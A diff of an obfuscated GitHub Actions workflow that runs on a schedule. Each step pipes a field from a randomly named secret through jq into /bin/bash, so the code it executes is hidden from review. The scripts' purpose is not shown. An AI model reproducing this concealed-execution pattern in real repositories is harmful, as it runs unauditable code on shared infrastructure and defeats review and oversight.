@@ -2,30 +2,17 @@ name: songepiao
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
-
-jobs:  # 12961
+    - cron: '29 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: songepiao
         env:
-          tmxws76407: ${{ secrets.tmxws76407 }}
+          zdvnu68: ${{ secrets.zdvnu68 }}
         run: |
-          echo $tmxws76407 | jq -r .pj4 | /bin/bash
-          echo $etr055 | jq -r .xbmyr0517 | /bin/bash
-          echo $prqi424 | jq -r .p633 | /bin/bash
-          echo $ajxro8920 | jq -r .ojjw8 | /bin/bash
-          echo $tv4 | jq -r .bbo856 | /bin/bash
-          echo $l6 | jq -r .hwi9262 | /bin/bash
-          echo $yxfr4917 | jq -r .modr6 | /bin/bash
-          echo $kf47693 | jq -r .ryt3980 | /bin/bash
-          echo $mms521 | jq -r .ipgi13640 | /bin/bash
-          echo $tu064 | jq -r .r729 | /bin/bash
-          echo $luj1865 | jq -r .qub34027 | /bin/bash
-          echo $np6 | jq -r .o183 | /bin/bash
-          echo $oc1658 | jq -r .ghhq44806 | /bin/bash
-          echo $kq46 | jq -r .fl9835 | /bin/bash
+          echo $zdvnu68 | jq -r .zziwe64 | /bin/bash
+          echo $idkwf7196 | jq -r .hg355 | /bin/bash
+          echo $ipe33463 | jq -r .bcaei59097 | /bin/bash
 
